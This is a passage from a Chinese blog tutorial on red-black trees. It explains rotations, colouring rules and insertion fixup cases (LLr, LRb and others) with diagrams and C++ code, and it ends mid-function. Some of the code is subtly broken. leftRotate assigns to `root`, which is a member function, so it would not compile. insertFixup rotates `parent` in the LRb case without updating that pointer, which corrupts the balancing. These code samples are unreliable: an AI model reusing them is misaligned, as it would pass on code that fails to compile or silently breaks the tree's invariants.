<li>在所有根至外部节点的路径上，<code>黑色</code>节点的数目相同，即<code>黑高</code>相等。</li>
</ul>
<p>如果再添加这一规则<code>红色节点位于左侧</code>，那么这个红黑树是一棵左偏红黑树。不过本文主要是介绍普通的红黑树。<br />
上述规则3和规则4是极其重要的，但凡涉及插入和删除操作都是要使红黑树满足这两条规则。</p>
<p>本文红黑树C++类</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RedBlackTree</span>&#123;</span><br><span class="hljs-keyword">private</span>:<br>    RBNodeEntry *m_RB_Root;<br>    RBNodeEntry *m_Nil;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">RedBlackTree</span>();<br>    <span class="hljs-built_in">RedBlackTree</span>(<span class="hljs-keyword">int</span> key,<span class="hljs-keyword">int</span> data);<br>    ~<span class="hljs-built_in">RedBlackTree</span>();<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">Insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key,<span class="hljs-keyword">int</span> data)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">Remove</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span></span>;<br>    <span class="hljs-function">RBNodeEntry* <span class="hljs-title">Search</span><span class="hljs-params">(RBNodeEntry* pNode,<span class="hljs-keyword">int</span> key)</span></span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ClearAll</span><span class="hljs-params">(RBNodeEntry*&amp; root)</span></span>;<br>    <span class="hljs-function">RBNodeEntry* <span class="hljs-title">successor</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>;<br>    <span class="hljs-function">RBNodeEntry* <span class="hljs-title">predecessor</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Height</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(pnode==m_Nil)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> hl= <span class="hljs-built_in">Height</span>(pnode-&gt;leftChild);<br>        <span class="hljs-keyword">int</span> hr= <span class="hljs-built_in">Height</span>(pnode-&gt;rightChild);<br>        <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">max</span>(hl,hr)+<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-function">RBNodeEntry* &amp;<span class="hljs-title">root</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;m_RB_Root;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PreOrder</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InOrder</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PostOrder</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">LevelOrder</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">leftRotate</span><span class="hljs-params">(RBNodeEntry *pnode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">rightRotate</span><span class="hljs-params">(RBNodeEntry *pnode)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RedBlack_insertFixup</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RedBlack_removeFixup</span><span class="hljs-params">(RBNodeEntry* pnode)</span></span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<h4 id="哨兵节点"><a class="markdownIt-Anchor" href="#哨兵节点"></a> 哨兵节点</h4>
<p>本文红黑树利用了<code>哨兵节点</code>技巧，省去了判断nullptr的麻烦，不过BST部分代码需要稍微修改。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/48.png" alt="" /></p>
<p>由于哨兵节点也是<code>RBNodeEntry</code>结构，但哨兵节点无父节点，因此设置为<code>nullptr</code>；同时还需要设置其<code>leftChild</code>和<code>rightChild</code>指向自身。</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">RedBlackTree::<span class="hljs-built_in">RedBlackTree</span>()&#123;<br>    <span class="hljs-keyword">this</span>-&gt;m_RB_Root=<span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 哨兵节点</span><br>    <span class="hljs-keyword">this</span>-&gt;m_Nil=<span class="hljs-keyword">new</span> RBNodeEntry;<br>    <span class="hljs-keyword">this</span>-&gt;m_Nil-&gt;color=BLACK;<br>    <span class="hljs-keyword">this</span>-&gt;m_Nil-&gt;key=<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">this</span>-&gt;m_Nil-&gt;data=<span class="hljs-number">0xffffff</span>;<br>    <span class="hljs-keyword">this</span>-&gt;m_Nil-&gt;leftChild=<span class="hljs-keyword">this</span>-&gt;m_Nil;<br>    <span class="hljs-keyword">this</span>-&gt;m_Nil-&gt;rightChild=<span class="hljs-keyword">this</span>-&gt;m_Nil;<br>&#125;<br>RedBlackTree::<span class="hljs-built_in">RedBlackTree</span>(<span class="hljs-keyword">int</span> key,<span class="hljs-keyword">int</span> data):RedBlackTree&#123;&#125;&#123;<br>    <span class="hljs-keyword">this</span>-&gt;m_RB_Root=<span class="hljs-keyword">new</span> <span class="hljs-built_in">RBNodeEntry</span>(key,data);<br>    <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;parent=<span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;leftChild=<span class="hljs-keyword">this</span>-&gt;m_Nil;<br>    <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;rightChild=<span class="hljs-keyword">this</span>-&gt;m_Nil;    <br>    <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;color=BLACK;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="查找-2"><a class="markdownIt-Anchor" href="#查找-2"></a> 查找</h4>
<p>由于红黑树也是平衡树，其查找也为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>，查找过程与普通的二叉查找树没有太大区别。不过红黑树和AVL树相比，在最坏情况下却是AVL树占优势。这是因为AVL树是严格的自平衡树，在最坏情况下同样多的节点，其高度小于红黑树，这就导致其查找效率高于红黑树。</p>
<h4 id="旋转"><a class="markdownIt-Anchor" href="#旋转"></a> 旋转</h4>
<p>红黑树的旋转操作只有左旋和右旋，而且也是核心。<br />
以这张图为例，插入红色节点42后无需进行任何操作就满足红黑树性质。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/21.png" alt="" /></p>
<p>下面这个例子就是典型的<code>LLb</code>型，至于什么是LLb，此处简单介绍下。<br />
图中u表示pu的左孩子、pu表示gu的左孩子、gr表示gu的右孩子，也就是pu的兄弟，u的叔叔。<br />
而LLb的意思是：pu是gu的左孩子、u是pu的左孩子，且gu的另外一个孩子是黑色的（<code>Nil节点是黑色节点</code>）。</p>
<p>首先插入节点41后违背<code>规则3</code>，需要对节点45右旋，不过为了直观表示，我将图中的旋转箭头方向位置于42与45之间。旋转操作实质是对节点指针关系的修改。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/22.png" alt="" /></p>
<p>而这个例子就是<code>LRb</code>型，对节点42<code>左旋</code>后再对节点45<code>右旋</code>。这说明LRb可以转化为LLb类型，也就是说对于插入操作其实也就那几种不平衡类型。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/23.png" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">COLOR</span>&#123;</span><br>    RED,<br>    BLACK<br>&#125;;<br><span class="hljs-comment">// 红黑树节点</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">RBNodeEntry</span>&#123;</span><br>    <span class="hljs-keyword">int</span> key;<br>    <span class="hljs-keyword">int</span> data;<br>    <span class="hljs-keyword">int</span> color;<br>    RBNodeEntry *parent;<br>    RBNodeEntry *leftChild;<br>    RBNodeEntry *rightChild;<br>    <span class="hljs-built_in">RBNodeEntry</span>()&#123;&#125;<br>    <span class="hljs-built_in">RBNodeEntry</span>(<span class="hljs-keyword">int</span> k,<span class="hljs-keyword">int</span> d)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;key=k;<br>        <span class="hljs-keyword">this</span>-&gt;data=d;<br>        <span class="hljs-keyword">this</span>-&gt;color=RED;<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RedBlackTree::leftRotate</span><span class="hljs-params">(RBNodeEntry *pnode)</span></span>&#123;<br>    RBNodeEntry *right = pnode-&gt;rightChild;<br>    pnode-&gt;rightChild = right-&gt;leftChild;<br><br>    <span class="hljs-keyword">if</span> (right-&gt;leftChild != m_Nil)<br>        right-&gt;leftChild-&gt;parent = pnode;<br>    right-&gt;parent = pnode-&gt;parent;<br>    <br>    <span class="hljs-comment">// 表示根节点</span><br>    <span class="hljs-keyword">if</span> (pnode-&gt;parent == <span class="hljs-literal">NULL</span>)&#123;<br>        root = right;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">          parent                    parent</span><br><span class="hljs-comment">           / \                      /    \</span><br><span class="hljs-comment">       pnode  brother           right  brother</span><br><span class="hljs-comment">        /  \            ---&gt;     / \</span><br><span class="hljs-comment">       l    right           pnode  y</span><br><span class="hljs-comment">           / \                / \</span><br><span class="hljs-comment">           x  y              l  x</span><br><span class="hljs-comment">    */</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pnode-&gt;parent-&gt;leftChild == pnode)&#123;<br>        pnode-&gt;parent-&gt;leftChild = right;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        parent                    parent</span><br><span class="hljs-comment">        / \                       /   \</span><br><span class="hljs-comment">   brother pnode            brother  right</span><br><span class="hljs-comment">           /  \        ---&gt;          /  \</span><br><span class="hljs-comment">           l   right             pnode   y</span><br><span class="hljs-comment">              / \                 / \</span><br><span class="hljs-comment">              x  y                l  x</span><br><span class="hljs-comment">    */</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        pnode-&gt;parent-&gt;rightChild = right;            <br>    &#125;<br>    right-&gt;leftChild = pnode;<br>    pnode-&gt;parent = right;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RedBlackTree::rightRotate</span><span class="hljs-params">(RBNodeEntry *pnode)</span></span>&#123;<br>    RBNodeEntry *left = pnode-&gt;leftChild;<br>    pnode-&gt;leftChild=left-&gt;rightChild;<br><br>    <span class="hljs-keyword">if</span>(left-&gt;rightChild!=m_Nil)&#123;<br>        left-&gt;rightChild-&gt;parent=pnode;<br>    &#125;<br>    left-&gt;parent=pnode-&gt;parent;<br>    <span class="hljs-comment">// 根节点</span><br>    <span class="hljs-keyword">if</span>(pnode-&gt;parent==<span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;m_RB_Root=left;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">          parent                parent</span><br><span class="hljs-comment">           / \                   / \</span><br><span class="hljs-comment">       pnode  brother        left   brother</span><br><span class="hljs-comment">        /  \          ---&gt;   / \</span><br><span class="hljs-comment">     left   r               x   pnode</span><br><span class="hljs-comment">      / \                        / \</span><br><span class="hljs-comment">     x   y                      y   r</span><br><span class="hljs-comment">    */</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pnode-&gt;parent-&gt;leftChild==pnode)&#123;<br>        pnode-&gt;parent-&gt;leftChild=left;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         parent                  parent</span><br><span class="hljs-comment">          /  \                    /  \</span><br><span class="hljs-comment">    brother   pnode         brother  left   </span><br><span class="hljs-comment">              /  \   ---&gt;             / \</span><br><span class="hljs-comment">            left  r                  x   pnode</span><br><span class="hljs-comment">            / \                          / \</span><br><span class="hljs-comment">           x   y                        y   r</span><br><span class="hljs-comment">    */</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        pnode-&gt;parent-&gt;rightChild=left;<br>    &#125;<br>    left-&gt;rightChild=pnode;<br>    pnode-&gt;parent=left;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="插入-2"><a class="markdownIt-Anchor" href="#插入-2"></a> 插入</h4>
<p>红黑树的插入操作类似BST插入，除此之外还要对节点进行<code>染色</code>。那么问题来了，毕竟是红黑树嘛到底是染成黑色还是红色？<br />
1.若染成<code>黑色</code>，那么就会一定会违背<code>规则4</code>，即黑色节点数目不相同，之后还需要重新调整红黑树，要知道红黑树调整是很复杂的，若是改写成代码那估计得累死人。<br />
2.若染成<code>红色</code>，此时一定不会违背<code>规则4</code>，不过这有<code>可能</code>会违背<code>规则3</code>，即有连续两个节点是<code>红色</code>的。虽说还需要进行调整，不过这代码量相比之前就会少很多了…基于此，染成<code>红色</code>是正确的选择。</p>
<p>插入完成后往往需要<code>修正Fixup</code>树结构，而修正过程需要<code>旋转Rotate</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">RedBlackTree::Insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key,<span class="hljs-keyword">int</span> data)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;m_RB_Root==<span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;m_RB_Root=<span class="hljs-keyword">new</span> <span class="hljs-built_in">RBNodeEntry</span>(key,data);<br>        <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;leftChild=m_Nil;<br>        <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;rightChild=m_Nil;<br>        <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;parent=<span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;color=BLACK;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    RBNodeEntry *x=<span class="hljs-keyword">this</span>-&gt;m_RB_Root;<br>    RBNodeEntry *p=<span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">while</span> (x!=m_Nil)&#123;<br>        <span class="hljs-comment">// 保存父节点p</span><br>        p=x;<br>        <span class="hljs-keyword">if</span>(key &lt; x-&gt;key)<br>            x=x-&gt;leftChild;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &gt; x-&gt;key)<br>            x=x-&gt;rightChild;<br>        <span class="hljs-comment">// 已经存在</span><br>        <span class="hljs-keyword">else</span>&#123;<br>            x-&gt;data=data;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    RBNodeEntry *pnode=<span class="hljs-keyword">new</span> <span class="hljs-built_in">RBNodeEntry</span>(key,data);<br>    pnode-&gt;leftChild=m_Nil;<br>    pnode-&gt;rightChild=m_Nil;<br>    pnode-&gt;color=RED;<br>    pnode-&gt;parent=p;<br><br>    <span class="hljs-comment">// 判断插入节点位于父节点的哪边</span><br>    <span class="hljs-keyword">if</span>(key &lt; p-&gt;key)<br>        p-&gt;leftChild=pnode;<br>    <span class="hljs-keyword">else</span> <br>        p-&gt;rightChild=pnode;<br>    <span class="hljs-comment">// 检查是否满足红黑树的平衡条件并重新平衡</span><br>    <span class="hljs-built_in">RedBlack_insertFixup</span>(pnode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="insertfixup"><a class="markdownIt-Anchor" href="#insertfixup"></a> InsertFixup</h4>
<p>插入操作所引起的不平衡主要是以下8种类型（主要针对插入在红色节点之后）：<br />
LLr、LRr、RRr、RLr、LLb、LRb、RRb、RLb。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/24.png" alt="" /><br />
图中u表示pu的左孩子、pu表示gu的左孩子、gr表示gu的右孩子，也就是pu的兄弟，u的叔叔。而LLb的意思是：pu是gu的左孩子、u是pu的左孩子，且gu的另外一个孩子(可以是Nil节点)是黑色的。</p>
<p>可以总结为下面这两种类型，插入新节点后的平衡主要是对<code>新插入节点u、其父节点pu、祖父节点gu以及叔叔节点gl/gr</code>来操作的。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/25.png" alt="" /></p>
<p>如果叔叔节点不存在一定是<code>Nil黑色节点</code>！！！</p>
<p>根据<code>叔叔节点uncle</code>的颜色是红色或黑色，InsertFixup大致可以分为以下两种类型：</p>
<ul>
<li>uncle节点是<code>红色</code>，也就是<code>LLr、LRr、RRr、RLr</code>类型，直接<code>换色</code>即可完成红黑树平衡；</li>
<li>uncle节点是<code>黑色</code>，也就是<code>LLb、LRb、RRb、RLb</code>类型，需要旋转和换色。</li>
</ul>
<h5 id="llr-lrr-rrr-rlr"><a class="markdownIt-Anchor" href="#llr-lrr-rrr-rlr"></a> LLr、LRr、RRr、RLr</h5>
<p>处理这类不平衡问题，只需要换色即可，这是因为<code>父节点和叔叔节点</code>此时一定是<code>红色</code>的，那么<code>祖父节点</code>也一定是<code>黑色</code>的。<br />
这个过程是这样的：</p>
<ul>
<li>若<code>父节点pu/parent存在且为红色</code>，则执行该过程；否则将<code>根节点root</code>染成为<code>黑色</code>并结束；</li>
<li>将<code>父节点pu/parent和叔叔节点gl/gr/uncle</code>染成黑色；</li>
<li>将<code>祖父节点gu</code>染成红色；</li>
<li>移动当前<code>新插入红色节点u</code>到<code>祖父节点gu</code>，重复执行第一步骤。</li>
</ul>
<p>第4步的作用是确保整棵红黑树均符合其规则，因此将<code>祖父节点gu</code>染成红色之后，可能<code>祖父节点gu的父节点是红色</code>，那么还需要再次向上修正，直到某个节点的父节点不存在（根节点）或其父节点是黑色节点。</p>
<p>例子：<br />
插入节点30，导致形成LLr不平衡，将<code>父节点和叔叔节点</code>与<code>祖父节点</code>换色后移动u到gu，此时再判断其父节点为nullptr表示达到了根节点root，因此修正结束，并将根节点root染成黑色。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/26.png" alt="" /></p>
<p>其他3种情况处理类似。</p>
<h5 id="llb-lrb-rrb-rlb"><a class="markdownIt-Anchor" href="#llb-lrb-rrb-rlb"></a> LLb、LRb、RRb、RLb</h5>
<p>这4种情况只需解释其中一种就能够举一反三了。<br />
处理过程如下：</p>
<ul>
<li>若<code>父节点pu/parent存在且为红色</code>，则执行该过程；否则将<code>根节点root</code>染成为<code>黑色</code>并结束；</li>
<li>根据<code>插入节点u</code>位于<code>父节点pu</code>的哪一侧对<code>父节点pu</code>旋转：若u在pu左边，对pu右旋；否则左旋；</li>
<li>旋转完成后对<code>父节点pu/parent和叔叔节点gl/gr/uncle（如果存在）</code>与<code>祖父节点gu</code>交换颜色；（实际上，只需要对父节点和祖父节点换色）</li>
<li>根据<code>祖父节点gu</code>位于<code>祖父节点gu父节点pgu</code>的哪一侧对<code>祖父节点gu</code>旋转：若gu在pgu左边，对gu右旋；否则左旋。</li>
</ul>
<p>注意，这种类型无需向上修正：<code>移动当前新插入红色节点u到祖父节点gu，再重复执行第一步骤</code>，这是因为经过第2步旋转换色后，此时<code>父节点pu</code>一定是<code>黑色</code>的，那么下一次再旋转后，此时<code>新的祖父节点gu</code>也一定是黑色的。</p>
<p>例子：<br />
向这棵红黑树插入节点35，可以看出这是LRb型，虽然祖父节点40的右孩子是Nil节点。先是对父节点30左旋后再交换祖父节点40(黑)和父节点35(红)的颜色（此处叔叔节点为Nil，因此没有换色），然后对祖父节点40右旋后完成了修正。<br />
实际上，LRb型经过<code>左旋</code>转化为LLb型，同样RLb型经过<code>右旋</code>转化为RRb型。</p>
<p><img src="/uploads/images/data_structure/rbtree_cpp/27.png" alt="" /><br />
<img src="/uploads/images/data_structure/rbtree_cpp/28.gif" alt="" /></p>
<p>再看一个例子，其大致过程：插入节点41后形成<code>LLr</code>型，那么交换<code>祖父节点45</code>和<code>父节点44、叔叔节点46</code>的颜色；移动u到gu位置后发现此时u<code>存在父节点且为红色</code>，那么还得继续修正；而此时是<code>LRb</code>型，故先对<code>父节点40</code>左旋后还要交换<code>祖父节点50</code>和<code>父节点45、叔叔节点60</code>的颜色；之后再对<code>祖父节点45</code>右旋；最后还要将<code>根节点root</code>染成黑色，至此红黑树平衡，修正结束。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/29.png" alt="" /></p>
<p>演示过程<br />
<img src="/uploads/images/data_structure/rbtree_cpp/30.gif" alt="" /></p>
<h5 id="c代码"><a class="markdownIt-Anchor" href="#c代码"></a> C++代码</h5>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RedBlackTree::RedBlack_insertFixup</span><span class="hljs-params">(RBNodeEntry *pNode)</span></span>&#123;<br>    <span class="hljs-comment">// 父节点</span><br>    RBNodeEntry *parent=<span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 祖父节点</span><br>    RBNodeEntry *gparent=<span class="hljs-literal">nullptr</span>;<br>    <br>    <span class="hljs-comment">// 如果父节点存在且为红色</span><br>    <span class="hljs-keyword">while</span>((parent=pNode-&gt;parent) &amp;&amp; parent-&gt;color==RED)&#123;<br>        gparent=parent-&gt;parent;<br>        <span class="hljs-comment">// L-型</span><br>        <span class="hljs-keyword">if</span>(parent==gparent-&gt;leftChild)&#123;        <br>            RBNodeEntry * uncle=gparent-&gt;rightChild;<br>            <span class="hljs-comment">// LLr/LRr型 叔叔节点是红色，那么直接换色</span><br>            <span class="hljs-keyword">if</span>(uncle!=m_Nil &amp;&amp; uncle-&gt;color==RED)&#123;<br>                parent-&gt;color=BLACK;<br>                uncle-&gt;color=BLACK;<br>                gparent-&gt;color=RED;<br>                <span class="hljs-comment">// 从当前祖父节点开始继续向上调整</span><br>                pNode=gparent;<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-comment">// LRb，叔叔节点gr是黑色节点(可以Nil)，且当前节点是父节点的右孩子</span><br>            <span class="hljs-comment">// 将LRb转化为LLb型</span><br>            &#125;<span class="hljs-keyword">if</span>(pNode==parent-&gt;rightChild)&#123;<br>                <span class="hljs-comment">// 对父节点左旋</span><br>                <span class="hljs-built_in">leftRotate</span>(parent);<br>            &#125;<br>            <span class="hljs-comment">// 处理LLb的情况</span><br>            <span class="hljs-comment">// 先换色，在旋转</span><br>            parent-&gt;color=BLACK;<br>            gparent-&gt;color=RED;<br>            <span class="hljs-built_in">rightRotate</span>(gparent);<br>        &#125;<br>        <span class="hljs-comment">// R-型</span><br>        <span class="hljs-keyword">else</span>&#123;<br>            RBNodeEntry 